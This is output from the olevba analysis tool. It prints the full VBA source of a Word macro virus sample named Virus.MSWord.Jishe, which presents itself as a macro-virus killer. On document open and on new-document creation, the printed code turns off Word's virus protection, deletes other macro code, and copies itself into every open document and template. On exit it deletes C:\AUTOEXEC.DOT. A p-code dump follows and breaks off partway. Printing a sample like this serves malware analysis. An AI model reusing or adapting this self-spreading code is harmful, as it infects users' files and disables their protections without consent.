olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Jishe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Jishe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾
'ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾
'¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦
'Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦
'»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿
'³ÌÐòÉè¼Æ: ¼½É÷»ª
'°ì¹«µç»°:
'ÒÁÃÃµØÖ·: club@263.net
Option Explicit '³ÌÐòÖÐµÄ±äÁ¿±ØÐëÏÈ¶¨ÒåºóÊ¹ÓÃ
Const answer0 = "FreeWordMacroVirusKiller" '±£³ÖÓëÒÔÇ°°æ±¾µÄ¼æÈÝÐÔ
Const answer1 = "MyMacroVirusKillerV1.0"
Const answer2 = "MyMacroVirusKillerV2.0" '±¾³ÌÐò±êÖ¾
'Version 2.0
Private Sub Document_Open()
    CloseVirusProtection
    '¼ì²é´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO JiShenhua.bas 
in file: ./Virus.MSWord.Jishe - OLE stream: 'Macros/VBA/JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾
'ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾
'¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦
'Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦
'»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿
'³ÌÐòÉè¼Æ: ¼½É÷»ª
'°ì¹«µç»°:
'ÒÁÃÃµØÖ·: club@263.net
Option Explicit '³ÌÐòÖÐµÄ±äÁ¿±ØÐëÏÈ¶¨ÒåºóÊ¹ÓÃ
Public pVirusReport As String '²¡¶¾ÃèÊöÐÅÏ¢
Private Const cMyID As String = "MyMacroVirusKillerV2.0" '±¾³ÌÐò´úÂë±êÖ¾
Private Const cMyModule As String = "JiShenhua" '±¾³ÌÐòµÄÄ£¿éÃû³Æ
Private Const cMyUserForm As String = "VirusReport" '±¾³ÌÐòµÄÓÃ»§´°¿ÚÃû³Æ
Private Const cOK As Integer = 0 'Ò»ÇÐÕý³£
Private Const cDocHasModuleElse As Integer = 1 'ÓÐÆäËûÄ£¿é´æÔÚ
Private Const cDocHasCodeElse As Integer = 2 'ÔÚThisDocumentÄ£¿éÖÐÓÐÆäËû´úÂë´æÔÚ
Private Const cDocHasAllElse As Integer = 3 'ÔÚThisDocumentÄ£¿éÖÐÓÐÆäËû´úÂë´æÔÚ£¬²¢ÓÐÆäËûÄ£¿é´æÔÚ
Private Const cDocProtected As Integer = 4 '¸ÃÎÄµµ±»±£»¤
'´ò¿ªÎÄµµÊ±×Ô¶¯Ö´ÐÐ
Sub AutoOpen()
    CloseVirusProtection
    '¼ì²é´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾,Èç¹ûÓÐ²¡¶¾£¬ÏòÓÃ»§Ìá³ö±¨¸æ
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
'ÐÂ½¨ÎÄµµÊ±×Ô¶¯Ö´ÐÐ
Sub AutoNew()
    CloseVirusProtection
    Infect Word.ActiveDocument
End Sub
'¹Ø±ÕWORDÖ®Ç°ÇåÀíautoexec.dotÎÄ¼þÖÐµÄ²¡¶¾
Sub AutoExit()
    Const AutoDotFile = "C:\AUTOEXEC.DOT"
    If Dir(AutoDotFile) <> "" Then
        Kill AutoDotFile
    End If
End Sub
'´ÓÖ¸¶¨ÎÄ¼þÖÐÏòËùÓÐ´ò¿ªÎÄµµ¼°Ä£°åÖÐ¸´ÖÆ±¾³ÌÐò´úÂë¼°Ä£¿é
Public Function InfectAll() As Boolean
    Dim myDoc As Document, myTemp As Template
    'Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾´úÂë
    For Each myDoc In Documents
        Infect myDoc
    Next myDoc
    'ÏòWORDÄ£°åÖÐÐ´Èë±¾´úÂë
    For Each myTemp In Templates
        Infect myTemp
    Next myTemp
    InfectAll = True
End Function
'Çå³ýËùÓÐ´ò¿ªÎÄµµ¼°Ä£°åÖÐµÄ²¡¶¾Ä£¿é¼°´úÂë
Public Function ClearVirus() As Boolean
    Dim i As Integer
    Dim myDoc As Document, myTemp As Template
    Dim Cleared As Boolean

    ClearVirus = True
    '¼ì²éËùÓÐÎÄµµ²¢Çå³ý
    For Each myDoc In Documents
        Cleared = ClearDocument(myDoc)
        If Not Cleared Then
            MsgBox "²¡¶¾Çå³ý¹¤×÷²»³É¹¦£¬Çë¼ì²éÔ­Òò¡£", vbOKOnly, myDoc.Name
            ClearVirus = False
        End If
    Next myDoc
    '¼ì²éËùÓÐÄ£°å²¢Çå³ý
    For Each myTemp In Templates
        Cleared = ClearDocument(myTemp)
        If Not Cleared Then
            MsgBox "²¡¶¾Çå³ý¹¤×÷²»³É¹¦£¬Çë¼ì²éÔ­Òò¡£", vbOKOnly, myTemp.Name
            ClearVirus = False
        End If
    Next myTemp
End Function
'¼ì²éËùÓÐ´ò¿ªµÄÎÄµµ¼°Ä£°åÖÐÊÇ·ñÓÐ²¡¶¾´æÔÚ£¬Èç¹ûÓÐ£¬·µ»Ø²¡¶¾ÐÅÏ¢ÃèÊö×Ö·û´®
Public Function ScanVirus() As Boolean
    Dim DocsCount As Integer, i As Integer, ret As Integer
    Dim myStr As String
    Dim myDoc As Document, myTemp As Template
    
    ScanVirus = False
    pVirusReport = ""
    '¼ì²éËùÓÐ´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾
    For Each myDoc In Documents
        ret = ScanDocument(myDoc)
        Select Case ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "º¯ÊýScanDocument·µ»Ø´íÎó´úÂë£¬ÏµÍ³ÎÞ·¨Ê¶±ð¡£", vbOKOnly, "ÏµÍ³³ö´í"
        End Select
    Next myDoc
    '¼ì²éËùÓÐÄ£°å
    For Each myTemp In Templates
        ret = ScanDocument(myTemp)
        Select Case ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "º¯ÊýScanDocument·µ»Ø´íÎó´úÂë£¬ÏµÍ³ÎÞ·¨Ê¶±ð¡£", vbOKOnly, "ÏµÍ³³ö´í"
        End Select
    Next myTemp
End Function
'¹Ø±ÕWordºê²¡¶¾±£»¤¹¦ÄÜ
Public Function CloseVirusProtection(Optional Protected As Boolean = False)
    Options.VirusProtection = Protected
End Function
'°Ñ±¾³ÌÐò´úÂë´ÓÒ»¸öÎÄ¼þ¸´ÖÆµ½ÁíÒ»¸öÎÄ¼þÖÐ
Private Function Infect(TargetFile) As Boolean
    Dim xItem, CommandStr As String, file As String
    Dim myDoc As Document, myTemp As Template
    Dim LinesofCode As Long, myStr As String
    
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    myStr = TypeName(TargetFile)
    If myStr <> "Document" And myStr <> "Template" Then
        MsgBox "Ê¹ÓÃÊý¾ÝÀàÐÍ" + myStr + "µ÷ÓÃº¯ÊýInfect£¬ÏµÍ³Ö»ÔÊÐíÊ¹ÓÃDocument¼°TemplateÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Infect = False
        Exit Function
    End If
    Infect = True
    If TargetFile.Name = ThisDocument.Name Then Exit Function 'Ä¿±êÎÄ¼þÓëÔ´ÎÄ¼þÏàÍ¬Ê±²»Ö´ÐÐÐ´Èë²Ù×÷
    If Infected(TargetFile) Then Exit Function 'Ä¿±êÎÄ¼þÒÑ¾­´æÔÚ±¾³ÌÐò´úÂë
    If TargetFile.VBProject.Protection Then Exit Function 'Ä¿±êÎÄ¼þ±»±£»¤£¬²»ÄÜÖ´ÐÐÐ´Èë²Ù×÷
    Infect = False
    
    'Çå³ýÄ¿±êÎÄµµÖÐÒÑ¾­´æÔÚµÄÆäËûÄ£¿é¼°´úÂë
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.CodeModule.CountOfLines
            If LinesofCode > 0 Then xItem.CodeModule.DeleteLines 1, LinesofCode
        Else
            TargetFile.VBProject.VBComponents.Remove xItem
        End If
    Next xItem
    
    'ÏòÎÄµµÖÐÐ´Èë±¾³ÌÐò´úÂë¼°Ä£¿é
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyModule, TargetFile.FullName + ":" + cMyModule
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyUserForm, TargetFile.FullName + ":" + cMyUserForm

    ' ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^
    
    '¸Ã³ÌÐò¶ÎÈç¹û·ÅÔÚÇ°Á½¸öÓï¾äÖ®Ç°£¬¾Í»áµ¼ÖÂVBA32.DLL³ÌÐò³öÏÖÖÂÃü´íÎó¶øËÀ»ú£¬
    'ÇîÎÒÖ®±ÏÉú±à³Ì¾­Ñé£¬²»ÖªºÎ¹Ê£¬ÌìÄÄ£¡ÌìÀíºÎÔÚ£¿
    
    LinesofCode = ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
    myStr = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(1, LinesofCode)
    TargetFile.VBProject.VBComponents(1).CodeModule.InsertLines 1, myStr
    
    Infect = True
End Function
'¼ì²éÖ¸¶¨ÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾³ÌÐò´úÂë
Private Function Infected(TargetFile)
    Dim xItem, LinesofCode As Integer
    Dim HasVirus As Integer
    Dim myType As String
    
    myType = TypeName(TargetFile)
    If myType <> "Document" And myType <> "Template" Then
        MsgBox "Ê¹ÓÃÊý¾ÝÀàÐÍ" + myType + "µ÷ÓÃº¯ÊýInfected£¬ÏµÍ³Ö»ÔÊÐíÊ¹ÓÃDocument¼°TemplateÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Infected = True
        Exit Function
    End If
    
    '¼ì²éÄ¿±êÎÄµµÊÇ·ñ±»±£»¤
    If TargetFile.VBProject.Protection Then
        Infected = True
        Exit Function
    End If
    
    'µ±ThisDocument,myModule,myUserForm¾ù´æÔÚÊ±£¬±íÊ¾¸ÃÎÄ¼þÒÑ¾­±»¸ÐÈ¾
    HasVirus = 0
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.CodeModule.CountOfLines
            If (LinesofCode > 0) And (xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                HasVirus = HasVirus Or 1
            End If
        ElseIf xItem.Name = cMyModule Then
            HasVirus = HasVirus Or 2
        ElseIf xItem.Name = cMyUserForm Then
            HasVirus = HasVirus Or 4
        End If
    Next xItem
    If HasVirus = 7 Then
        Infected = True
    Else
        Infected = False
    End If
End Function
'¼ì²éÖ¸¶¨µÄ´ò¿ªÎÄµµ¼°Ä£°åÖÐÊÇ·ñÓÐ²¡¶¾´æÔÚ
Private Function ScanDocument(myDocOrTemp) As Integer
    Dim xItem, i As Integer, myStr As String
    Dim LinesofCode As Integer
    
    ScanDocument = cOK
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "µ÷ÓÃº¯ÊýScanDocumentÖ»ÄÜÊ¹ÓÃDocument¼°TemplateÊý¾ÝÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Exit Function
    End If
    myStr = myDocOrTemp.Name + "¼ì²é½á¹û£º" + Chr(10)
    '¼ì²é³ÌÐòÄ£¿éÊÇ·ñ±»±£»¤
    If myDocOrTemp.VBProject.Protection Then
        ScanDocument = cDocProtected
        myStr = myStr + "  ÎÄ¼þÖÐµÄ³ÌÐò´úÂë±»±£»¤£¬ÏµÍ³ÎÞ·¨×Ô¶¯²éÉ±£¬µ«Ò²¿ÉÄÜ´æÔÚ²¡¶¾£¬ÇëÐ¡ÐÄ£¡" + Chr(10)
        Exit Function
    End If
    For Each xItem In myDocOrTemp.VBProject.VBComponents
        If (xItem.Name = "ThisDocument") Then
            '´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾
            LinesofCode = xItem.CodeModule.CountOfLines
            If (LinesofCode > 0) And (Not xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                ScanDocument = ScanDocument Or cDocHasCodeElse
                myStr = myStr + "  <" + xItem.Name + ">¶ÔÏóÖÐÓÐÆäËû³ÌÐò´æÔÚ£¬´ó¸ÅÊÇ²¡¶¾¡£" + Chr(10)
            End If
        ElseIf (xItem.Name <> cMyModule) And (xItem.Name <> cMyUserForm) Then
            'ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾
            ScanDocument = ScanDocument Or cDocHasModuleElse
            myStr = myStr + "  ÓÐÆäËûÄ£¿é<" + xItem.Name + ">´æÔÚ£¬¼«ÓÐ¿ÉÄÜÊÇ²¡¶¾¡£" + Chr(10)
        End If
    Next
    If ScanDocument = cOK Then myStr = myStr + "  Ã»ÓÐ²¡¶¾£¬Çë·ÅÐÄÊ¹ÓÃ¡£" + Chr(10)
    pVirusReport = pVirusReport + myStr
End Function
'Çå³ýÖ¸¶¨µÄ´ò¿ªÎÄµµ¼°Ä£°åÖÐµÄ²¡¶¾Ä£¿é¼°´úÂë
Private Function ClearDocument(myDocOrTemp) As Boolean
    Dim xItem, LinesofCode As Integer
    
    ClearDocument = False
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "µ÷ÓÃº¯ÊýClearDocumentÖ»ÄÜÊ¹ÓÃDocument¼°TemplateÊý¾ÝÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Exit Function
    End If
    If myDocOrTemp.VBProject.Protection Then
        ClearDocument = True
        Exit Function
    End If
    '¼ì²éÎÄµµÊÇ·ñÓÐ²¡¶¾
    If ScanDocument(myDocOrTemp) Then
        For Each xItem In myDocOrTemp.VBProject.VBComponents
            If xItem.Name = "ThisDocument" Then
                LinesofCode = xItem.CodeModule.CountOfLines
                If (LinesofCode > 0) And (Not xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                    xItem.CodeModule.DeleteLines 1, LinesofCode
                End If
            ElseIf xItem.Name <> cMyModule And xItem.Name <> cMyUserForm Then
                myDocOrTemp.VBProject.VBComponents.Remove xItem
            End If
        Next
    End If
    ClearDocument = True
End Function
-------------------------------------------------------------------------------
VBA MACRO VirusReport.frm 
in file: ./Virus.MSWord.Jishe - OLE stream: 'Macros/VBA/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


























'´°Ìå³ÌÐò´úÂë
Option Explicit '³ÌÐòÖÐµÄ±äÁ¿±ØÐëÏÈ¶¨ÒåºóÊ¹ÓÃ
'´ò¿ª´°ÌåÊ±Ö´ÐÐµÄ²Ù×÷
Private Sub UserForm_Initialize()
    CheckBox1.Value = True
    Information.Value = pVirusReport
    Beep
End Sub
'¹Ø±Õ´°Ìå£¬²»×÷ÈÎºÎ´¦Àí
Private Sub CommandButtonNothing_Click()
    Dim ret As Integer
    ret = MsgBox("Áìµ¼£¬ËäÈ»Äã¿ÉÄÜ»áÅúÆÀÎÒ£¬µ«»¹ÊÇÒª¸æËßÄã£¬ÕâÑù×öÊÇºÜÎ£ÏÕµÄ¡£ÊÇ·ñÕæµÄ²»×ö´¦Àí£¬ÇëÅúÊ¾¡£", vbYesNo + vbDefaultButton2, "ÔÙ´Î±¨¸æ£¡")
    If ret = vbYes Then
        Unload Me
    End If
End Sub
'´ò¿ªVisulBasic±à¼­Æ÷
Private Sub CommandButtonOpenVisubasic_Click()
    ShowVisualBasicEditor = True
End Sub
'É±²¡¶¾
Private Sub CommandButtonKill_Click()
    If ClearVirus Then
        ResetMenu
        InfectAll
        Unload Me
        MsgBox "°´ÕÕÄúµÄÖ¸Ê¾£¬ÎÒÒÑ¾­°Ñ¿ÉÄÜÊÇ²¡¶¾µÄ¶«¶«È«²¿ÇåÀíÍê±Ï£¬²»¹ýÒ²¿ÉÄÜºÃÐÄ°ìÁË»µÊÂ£¬ÄÇ¿É²»Òª¹ÖÎÒÓ´¡£", vbOKOnly, "±¨¸æ£¡"
    Else
        MsgBox "²»ÖªÊ²Ã´Ô­Òò£¬Çå³ý²¡¶¾¹¤×÷²»³É¹¦£¬ÇëÄúÊÖ¹¤¼ì²é»òÓëÎÒÁªÏµ¡£", vbOKOnly, "¼½É÷»ªÏòÄú±¨¸æ£º"
        Unload Me
    End If
End Sub
'»Ö¸´±»²¡¶¾¸ü¸ÄµÄ²Ëµ¥Ïî
Private Function ResetMenu()
    Dim mItem, cItem, myKey As KeyBinding
    
    CustomizationContext = NormalTemplate
    'Alt+F8:´ò¿ªºê¶Ô»°¿ò
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    'Alt+F11:´ò¿ªVisualBasic±à¼­Æ÷
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyH)).Clear
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyK)).Clear

    '»Ö¸´¹¤¾ß²Ëµ¥µÄÔ­Ê¼ÉèÖÃ
    For Each mItem In CommandBars("Tools").Controls
        mItem.Reset
    Next mItem
    For Each cItem In CommandBars("Visual Basic").Controls
        cItem.Reset
    Next cItem
    For Each cItem In CommandBars
        If cItem.Visible = True Then
            cItem.Protection = msoBarNoProtection
        End If
    Next cItem
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Jishe
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2937 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0043 "ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾"
' Line #2:
' 	QuoteRem 0x0000 0x0045 "ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾"
' Line #3:
' 	QuoteRem 0x0000 0x003C "¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦"
' Line #4:
' 	QuoteRem 0x0000 0x0031 "Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦"
' Line #5:
' 	QuoteRem 0x0000 0x0037 "»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿"
' Line #6:
' 	QuoteRem 0x0000 0x0010 "³ÌÐòÉè¼Æ: ¼½É÷»ª"
' Line #7:
' 	QuoteRem 0x0000 0x0009 "°ì¹«µç»°:"
' Line #8:
' 	QuoteRem 0x0000 0x0016 "ÒÁÃÃµØÖ·: club@263.net"
' Line #9:
' 	Option  (Explicit)
' 	QuoteRem 0x0010 0x001C "³ÌÐòÖÐµÄ±äÁ¿±ØÐëÏÈ¶¨ÒåºóÊ¹ÓÃ"
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0018 "FreeWordMacroVirusKiller"
' 	VarDefn answer0
' 	QuoteRem 0x002B 0x0016 "±£³ÖÓëÒÔÇ°°æ±¾µÄ¼æÈÝÐÔ"
' Line #11:
' 	Dim (Const) 
' 	LitStr 0x0016 "MyMacroVirusKillerV1.0"
' 	VarDefn answer1
' Line #12:
' 	Dim (Const) 
' 	LitStr 0x0016 "MyMacroVirusKillerV2.0"
' 	VarDefn answer2
' 	QuoteRem 0x0029 0x000A "±¾³ÌÐò±êÖ¾"
' Line #13:
' 	QuoteRem 0x0000 0x000B "Version 2.0"
' Line #14:
' 	FuncDefn (Private Sub Document_Open())
' Line #15:
' 	ArgsCall CloseVirusProtection 0x0000 
' Line #16:
' 	QuoteRem 0x0004 0x001A "¼ì²é´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾"
' Line #17:
' 	Ld ScanVirus 
' 	IfBlock 
' Line #18:
' 	Ld VirusReport 
' 	ArgsCall Local 0x0001 
' Line #19:
' 	Ld VirusReport 
' 	ArgsMemCall Show 0x0000 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	ArgsCall InfectAll 0x0000 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	EndSub 
' Macros/VBA/JiShenhua - 16559 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0043 "ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾"
' Line #1:
' 	QuoteRem 0x0000 0x0045 "ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾"
' Line #2:
' 	QuoteRem 0x0000 0x003C "¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦"
' Line #3:
' 	QuoteRem 0x0000 0x0031 "Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦"
' Line #4:
' 	QuoteRem 0x0000 0x0037 "»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿"
' Line #5:
' 	QuoteRem 0x0000 0x0010 "³ÌÐòÉè¼Æ: ¼½É÷»ª"
' Line #6:
' 	QuoteRem 0x0000 0x0009 "°ì¹«µç»°:"
' Line #7:
' 	QuoteRem 0x0000 0x0016 "ÒÁÃÃµØÖ·: club@263.net"
' Line #8:
' 	Option  (Explicit)
' 	QuoteRem 0x0010 0x001C "³ÌÐòÖÐµÄ±äÁ¿±ØÐëÏÈ¶¨ÒåºóÊ¹ÓÃ"
' Line #9:
' 	Dim (Public) 
' 	VarDefn pVirusReport (As String)
' 	QuoteRem 0x001E 0x000C "²¡¶¾ÃèÊöÐÅÏ¢"
' Line #10:
' 	Dim (Private Const) 
' 	LitStr 0x0016 "MyMacroVirusKillerV2.0"
' 	VarDefn cMyID (As String)
' 	QuoteRem 0x0039 0x000E "±¾³ÌÐò´úÂë±êÖ¾"
' Line #11:
' 	Dim (Private Const) 
' 	LitStr 0x0009 "JiShenhua"
' 	VarDefn cMyModule (As String)
' 	QuoteRem 0x0030 0x0010 "±¾³ÌÐòµÄÄ£¿éÃû³Æ"
' Line #12:
' 	Dim (Private Const) 
' 	LitStr 0x000B "VirusReport"
' 	VarDefn cMyUserForm (As String)
' 	QuoteRem 0x0034 0x0014 "±¾³ÌÐòµÄÓÃ»§´°¿ÚÃû³Æ"
' Line #13:
' 	Dim (Private Const) 
' 	LitDI2 0x0000 
' 	VarDefn cOK (As Integer)
' 	QuoteRem 0x0021 0x0008 "Ò»ÇÐÕý³£"
' Line #14:
' 	Dim (Private Const) 
' 	LitDI2 0x0001 
' 	VarDefn cDocHasModuleElse (As Integer)
' 	QuoteRem 0x002F 0x000E "ÓÐÆäËûÄ£¿é´æÔÚ"
' Line #15:
' 	Dim (Private Const) 
' 	LitDI2 0x0002 
' 	VarDefn cDocHasCodeElse (As Integer)
' 	QuoteRem 0x002D 0x0022 "ÔÚThisDocumentÄ£¿éÖÐÓÐÆäËû´úÂë´æÔÚ"
' Line #16:
' 	Dim (Private Const) 
' 	LitDI2 0x0003 
' 	VarDefn cDocHasAllElse (As Integer)
' 	QuoteRem 0x002C 0x0034 "ÔÚThisDocumentÄ£¿éÖÐÓÐÆäËû´úÂë´æÔÚ£¬²¢ÓÐÆäËûÄ£¿é´æÔÚ"
' Line #17:
' 	Dim (Private Const) 
' 	LitDI2 0x0004 
' 	VarDefn cDocProtected (As Integer)
' 	QuoteRem 0x002B 0x000C "¸ÃÎÄµµ±»±£»¤"
' Line #18:
' 	QuoteRem 0x0000 0x0012 "´ò¿ªÎÄµµÊ±×Ô¶¯Ö´ÐÐ"
' Line #19:
' 	FuncDefn (Sub AutoOpen())
' Line #20:
' 	ArgsCall CloseVirusProtection 0x0000 
' Line #21:
' 	QuoteRem 0x0004 0x0035 "¼ì²é´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾,Èç¹ûÓÐ²¡¶¾£¬ÏòÓÃ»§Ìá³ö±¨¸æ"
' Line #22:
' 	Ld ScanVirus 
' 	IfBlock 
' Line #23:
' 	Ld VirusReport 
' 	ArgsCall Local 0x0001 
' Line #24:
' 	Ld VirusReport 
' 	ArgsMemCall Show 0x0000 
' Line #25:
' 	ElseBlock 
' Line #26:
' 	ArgsCall InfectAll 0x0000 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	EndSub 
' Line #29:
' 	QuoteRem 0x0000 0x0012 "ÐÂ½¨ÎÄµµÊ±×Ô¶¯Ö´ÐÐ"
' Line #30:
' 	FuncDefn (Sub AutoNew())
' Line #31:
' 	ArgsCall CloseVirusProtection 0x0000 
' Line #32:
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	ArgsCall Infect 0x0001 
' Line #33:
' 	EndSub 
' Line #34:
' 	QuoteRem 0x0000 0x0028 "¹Ø±ÕWORDÖ®Ç°ÇåÀíautoexec.dotÎÄ¼þÖÐµÄ²¡¶¾"
' Line #35:
' 	FuncDefn (Sub AutoExit())
' Line #36:
' 	Dim (Const) 
' 	LitStr 0x000F "C:\AUTOEXEC.DOT"
' 	VarDefn AutoDotFile
' Line #37:
' 	Ld AutoDotFile 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #38:
